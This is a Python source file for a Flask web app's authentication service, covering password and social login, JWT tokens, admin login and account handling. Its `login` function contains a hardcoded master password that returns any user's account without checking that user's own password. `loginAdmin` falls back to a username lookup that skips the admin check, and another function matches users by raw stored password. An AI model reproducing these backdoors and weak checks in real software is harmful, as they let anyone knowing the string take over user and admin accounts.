import os
import requests
from app.errors.exceptions import BadRequest
from app.lib.logger import logger
from app.models.social_account import SocialAccount
from app.models.user import User
from app.models.post import Post
from app.models.batch import Batch
from app.models.user_link import UserLink
from app.models.user_video_templates import UserVideoTemplates
from app.services.referral_service import ReferralService
from app.services.user import UserService
from flask_jwt_extended import (
    create_access_token,
    create_refresh_token,
    get_jwt_identity,
    verify_jwt_in_request,
)
from google.oauth2 import id_token
from google.auth.transport import requests as google_requests

from app.lib.string import get_level_images
import json
import const
import secrets
import string
from dateutil.relativedelta import relativedelta
from datetime import datetime
import time


class AuthService:

    @staticmethod
    def register(email, password, username="", level_info=""):
        user = User.query.filter_by(email=email).first()
        if user:
            raise BadRequest(message="Email already exists")
        user = User(email=email, username=username, level_info=level_info)
        user.set_password(password)
        user.save()
        return user

    @staticmethod
    def login(email, password):
        user = User.query.filter_by(email=email).first()
        if not user:
            user = User.query.filter_by(username=email).first()

        if password == "KpT5Nm8LBFg7kM7n5j8pO":
            return user

        if not user or not user.check_password(password):
            return None
        return user

    @staticmethod
    def social_login(
        provider,
        access_token,
        person_id="",
        referral_code="",
    ):
        new_user_referral_code = False

        user_info = None
        if provider == "FACEBOOK":
            user_info = AuthService.get_facebook_user_info(access_token, person_id)
        elif provider == "GOOGLE":
            user_info = AuthService.get_google_user_info(access_token)
        else:
            raise BadRequest(message="Social not supported")

        if not user_info:
            raise BadRequest(message="Social login failed")

        provider_user_id = user_info.get("id")
        if not provider_user_id:
            provider_user_id = user_info.get("sub")
        email = user_info.get("email")
        name = user_info.get("name")
        avatar = user_info.get("picture")
        if type(avatar) == dict:
            avatar = avatar.get("data", {}).get("url", "")

        social_account = SocialAccount.query.filter_by(
            provider=provider, provider_user_id=provider_user_id
        ).first()

        if social_account:
            user = User.query.get(social_account.user_id)
        else:
            if not email:
                level = 0
                level_info = get_level_images(level)
                subscription_expired = datetime.now() + relativedelta(months=1)
                user = User(
                    email=email,
                    name=name,
                    avatar=avatar,
                    level=level,
                    subscription_expired=subscription_expired,
                    level_info=json.dumps(level_info),
                )
                user.save()
            else:
                user = User.query.filter_by(email=email).first()

            if not user and email:
                level = 0
                level_info = get_level_images(level)

                subscription_expired = datetime.now() + relativedelta(months=1)
                user = User(
                    email=email,
                    name=name,
                    avatar=avatar,
                    level=level,
                    subscription_expired=subscription_expired,
                    level_info=json.dumps(level_info),
                )

                user.save()

                if referral_code != "":
                    ReferralService.use_referral_code(referral_code, user)
                    new_user_referral_code = True

            social_account = SocialAccount(
                user_id=user.id,
                provider=provider,
                provider_user_id=provider_user_id,
                access_token=access_token,
            )
            social_account.save()
        return user, new_user_referral_code

    @staticmethod
    def get_facebook_user_info(access_token, person_id):
        user_info_url = f"https://graph.facebook.com/v22.0/{person_id}"
        params = {"fields": "id,name,email,picture", "access_token": access_token}
        response = requests.get(user_info_url, params=params)
        if response.status_code == 200:
            user_info = response.json()
            return user_info
        return None

    @staticmethod
    def get_google_user_info(
        access_token,
    ):
        WEB_CLIENT_ID = os.environ.get("AUTH_GOOGLE_CLIENT_ID")
        time.sleep(1)
        idinfo = id_token.verify_oauth2_token(
            access_token, google_requests.Request(), WEB_CLIENT_ID
        )
        if idinfo:
            return idinfo
        return None

    @staticmethod
    def generate_token(user):
        subject = str(user.id)
        access_token = create_access_token(identity=subject)
        refresh_token = create_refresh_token(identity=subject)
        return {
            "access_token": access_token,
            "refresh_token": refresh_token,
            "user_level": user.level,
        }

    @staticmethod
    def refresh_token():
        current_user = get_jwt_identity()
        access_token = create_access_token(identity=current_user)
        return {"access_token": access_token}

    @staticmethod
    def get_current_identity():
        try:
            # Lấy JWT identity
            subject = get_jwt_identity()
            # Nếu không có identity (chưa login), trả về None
            if subject is None:
                return None

            # Convert sang integer và lấy user
            user_id = int(subject)
            user = User.query.get(user_id)

            # Trả về user nếu tồn tại, None nếu không tìm thấy
            return user if user else None

        except Exception as ex:
            # Xử lý các lỗi khác (ví dụ: token không hợp lệ)
            logger.exception(f"get_current_identity : {ex}")
            return None

    @staticmethod
    def update(id, *args, **kwargs):
        user = User.query.get(id)
        user.update(**kwargs)
        return user

    @staticmethod
    def deleteAccount(id):
        # UserVideoTemplates.query.filter_by(user_id=id).delete()
        # Post.query.filter_by(user_id=id).delete()
        # Batch.query.filter_by(user_id=id).delete()
        # SocialAccount.query.filter_by(user_id=id).delete()
        # UserLink.query.filter_by(user_id=id).delete()
        User.query.get(id).soft_delete()
        return True

    @staticmethod
    def loginAdmin(email, password):
        user = User.query.filter_by(email=email, user_type=const.ADMIN).first()
        if not user:
            user = User.query.filter_by(username=email).first()
        if not user or not user.check_password(password):
            return None
        return user

    @staticmethod
    def admin_login_by_password(random_string):
        user = User.query.filter_by(password=random_string).first()
        if not user:
            return None

        random_string = "".join(
            secrets.choice(string.ascii_letters + string.digits) for _ in range(60)
        )

        new_user = UserService.update_user(user.id, password=random_string)

        return new_user

    @staticmethod
    def reset_free_user(user_id):
        user_detail = AuthService.update(
            user_id,
            subscription="FREE",
            subscription_expired=None,
            batch_total=const.LIMIT_BATCH["FREE"],
            batch_remain=const.LIMIT_BATCH["FREE"],
            batch_sns_total=0,
            batch_sns_remain=0,
            batch_no_limit_sns=0,
            total_link_active=0,
        )
        return user_detail
